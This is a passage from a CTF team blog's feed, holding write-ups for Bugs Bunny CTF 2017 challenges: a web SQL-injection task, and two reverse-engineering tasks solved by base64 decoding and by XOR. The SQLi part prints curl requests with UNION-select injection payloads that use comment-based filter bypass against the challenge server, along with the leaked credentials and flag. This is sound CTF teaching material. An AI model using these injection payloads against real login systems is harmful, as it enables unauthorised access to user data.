class="name">div</span>&gt;</span></div><div class="line">....</div></pre></td></tr></table></figure>
<p>With changing the limit we leaked all the passwords from the users as we can see the first user gave us an incomplete flag the others don’t seem to be part of the flag since there isn’t any “_” separating the words so lets assume our flag ends like “_Easy_I_Dont_Think}”.<br>The rest of the flag must be in the username column!</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/ctf&gt; curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'/**/union/**/select/**/username/**/from/**/users/**/limit/**/0,1--"</div><div class="line">No way SOrry</div></pre></td></tr></table></figure>
<p>Fuck they are filtering the username too? wee need another technique to get the username field! Lets try to make the query always true! and then inject an union query:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\"a\"/**/limit/**/0,1/**/--"</div><div class="line">...</div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> Bugs_Bunny&#123;SQLi_Easy_!!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\"a\"/**/limit/**/1,1/**/--"</div><div class="line">...</div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> a<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\"a\"/**/limit/**/2,1/**/--"</div><div class="line">...</div><div class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> flag_is<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line">...</div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\"a\"/**/limit/**/3,1/**/--"</div><div class="line">...</div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div><div class="line">curl "http://34.253.165.46/LQI_X/?username=test&amp;password=test'or/**/1/**/union/**/select/**/\"a\"/**/limit/**/4,1/**/--"</div><div class="line">...</div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"login-help"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> so_2017!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">...</div></pre></td></tr></table></figure>
<p>The flag is the combination of the some of this strings after some trial and error trying to login I could see that the login table is:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Users</div><div class="line">id username                password</div><div class="line">1  hello                   hello</div><div class="line">2  flag_is                 here            </div><div class="line">3  Bugs_Bunny&#123;SQLi_Easy_!! _Easy_I_Dont_Think</div><div class="line">4  so_2017!                &#125; </div><div class="line">5  <span class="built_in">test</span>                    <span class="built_in">test</span></div></pre></td></tr></table></figure>
<p>So the flag is Bugs_Bunny{SQLi<em>Easy</em>!!_Easy_I_Dont_Thinkso_2017!}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;LQI_X&lt;br&gt;140&lt;br&gt;&lt;br&gt;Its for your , login and get all you need&lt;br&gt;&lt;br&gt;task : &lt;a href=&quot;http://34.253.165.46/LQI_X/&quot; target=&quot;_b
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
    
      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
    
      <category term="filterbypass" scheme="https://teamrocketist.github.io/tags/filterbypass/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] BugsBunny CTF - Rev75</title>
    <link href="https://teamrocketist.github.io/2017/08/01/Reverse-BugsBunny-CTF-Rev75/"/>
    <id>https://teamrocketist.github.io/2017/08/01/Reverse-BugsBunny-CTF-Rev75/</id>
    <published>2017-08-01T08:03:50.000Z</published>
    <updated>2017-08-10T02:53:58.861Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>rev100<br>100<br><br>Find me faster !<br><br>Author: Aymen Borgi<br></blockquote>

<p>At first by checking the main function we can observe that it leads us to nowhere either gives us the strings “bad password” or “good but no flag for you hihihi xD” if we gave the right password which could be found simply by debugging and break points.</p>
<p>Now the flag must be in another functions there is alot starting from a0 to a814<br><img src="https://i.imgur.com/1sxwXmB.png"></p>
<p>By checking one of them we can see it contains a string that looks like they are encoded by base64<br><img src="https://i.imgur.com/knuiupq.png"></p>
<p>My plan was to copy all disassembled code from this functions and then use regex to get all the strings between quotes and concatenate them. After that I decoded the string and got a png image with the flag! here is the script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">strings = <span class="string">"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Y2jUqFHh97//fUZvq7q6OkyfPj389a9/DXPmzAnLli0LGzduDJWVlR4BhCYal9AUnVFUVBRKSkpCq1atQseOHUOfPn3CueeeGy688MJQXJyZV+8JwP9Od9FFF4Xx48eHfffdN28OlPr+6qVpj6EePXqEf/7zn8lHd7H33Ykbm4U/Lu1zY2dP7IzG2KOfAp4/f36YMWNGePXVV8PixYvD6tWrw6pVq0JVVVUoKysLXbt2DSeddFL4zne+E3r37u1elXo1a9YsdOzYMQwdOjTceuut4g+MSyjoznAZGH8pgbFpbNrn9rntuLftOwEIALB3cR1AAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEAEAAAgAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAgAAEABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEAAAAQgAIAABABCAAAAIQAAABCAAAAIQAAABCACAAAQAQAACACAAAQAQgAAACEAAAAQgAAACEABAANoEAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAAAEIAAAAhAAAAEIAIAABABAAAIAIAABAAQgAAACEAAAAQgAgAAEAEAAAgAgAAEAEIAAAAhAAACy5v8BjDWwa4oYZqgAAAAASUVORK5CYII="</span></div><div class="line">fh = open(<span class="string">"flag.png"</span>, <span class="string">"wb"</span>)</div><div class="line">fh.write(base64.b64decode(strings))</div><div class="line">fh.close()</div></pre></td></tr></table></figure>
<p>And now the flag<br><img src="https://i.imgur.com/MHU2qE0.png"></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;rev100&lt;br&gt;100&lt;br&gt;&lt;br&gt;Find me faster !&lt;br&gt;&lt;br&gt;Author: Aymen Borgi&lt;br&gt;&lt;/blockquote&gt;

&lt;p&gt;At first by checking the main function
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="base64" scheme="https://teamrocketist.github.io/tags/base64/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Bugs Bunny CTF - Rev100</title>
    <link href="https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/"/>
    <id>https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/</id>
    <published>2017-07-31T15:14:17.000Z</published>
    <updated>2017-08-10T03:13:15.198Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote><br>Find me faster !<br>Author: Aymen Borgi<br><a href="http://www.bugsbunnyctf.me/files/90e28c48809978263ae21beca17607aa/rev100.zip" target="_blank" rel="external">rev100.zip</a></blockquote><br>Starting to open our executable file on IDA:<br><a href="https://i.imgur.com/OA4oL0f.png" target="_blank" rel="external"><img src="https://i.imgur.com/OA4oL0f.png"></a><br><a href="https://i.imgur.com/bcszDk1.png" target="_blank" rel="external"><img src="https://i.imgur.com/bcszDk1.png"></a><br>There is some weird shit going around but we can see a function i_am_debugged() which leads you to exit the program if you running the program on a debugger like gdb or even IDA, there is alot of calls as you can see in the assembly code I could run the debugger and change those registers to not jump out of the program but since there was alot of calls I chose to do it in another way.<br>After a while I found this “loop” in the assembly code we can see they are just xoring two strange strings, variable “a” and variable “b” and then saving it on variable “c”.<br><a href="https://i.imgur.com/bcszDk1.png" target="_blank" rel="external"><img src="https://i.imgur.com/eP3TjL4.png"></a><br>Now we just need to find those “a” and “b” initial values and convert this assembly into python.<br>Finding “a” and “b” values is easy we can use IDA to do that:<br><a href="https://i.imgur.com/w7a1Tsf.png" target="_blank" rel="external"><img src="https://i.imgur.com/w7a1Tsf.png"></a><br><a href="https://i.imgur.com/TNlzG7X.png" target="_blank" rel="external"><img src="https://i.imgur.com/TNlzG7X.png"></a><br>Now we just write a python script equivalent to this assembly (Notice that wrote the strings in python as hex bytes because some characters weren’t pritable):</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">a = <span class="string">'\x61\x41\x40\x37\x6d\x77\x34\x2c\x5f\x41\x42\x60\x07\x34\x7d\x12\x57\x7a\x22\x25\x4f\x28'</span></div><div class="line">b = <span class="string">'\x23\x34\x27\x44\x32\x35\x41\x42\x31\x38\x39\x38\x37\x46\x22\x23\x24\x25\x44\x50\x21\x55'</span> </div><div class="line">c = <span class="string">''</span></div><div class="line">v4 = len(a) + <span class="number">1</span></div><div class="line">v5 = len(b) + <span class="number">1</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, v4<span class="number">-1</span>):</div><div class="line">	c += chr(ord(a[i])^ord(b[i]))</div><div class="line">	<span class="keyword">print</span> c</div><div class="line"><span class="keyword">print</span> c</div></pre></td></tr></table></figure>
<p>Running the script:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/ctf&gt; python rev100.py </div><div class="line">Bugs_Bunny&#123;X0r_1s_fun&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote&gt;&lt;br&gt;Find me faster !&lt;br&gt;Author: Aymen Borgi&lt;br&gt;&lt;a href=&quot;http://www.bugsbunnyctf.me/files/90e28c48809978263ae21beca17607aa/rev
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="xor" scheme="https://teamrocketist.github.io/tags/xor/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] - Bugs Bunny CTF - Rev 50</title>
    <link href="https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/"/>
    <id>https://teamrocketist.github.io/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/</id>
    <published>2017-07-31T14:16:03.000Z</published>
    <updated>2017-08-10T02:54:39.509Z</updated>
    
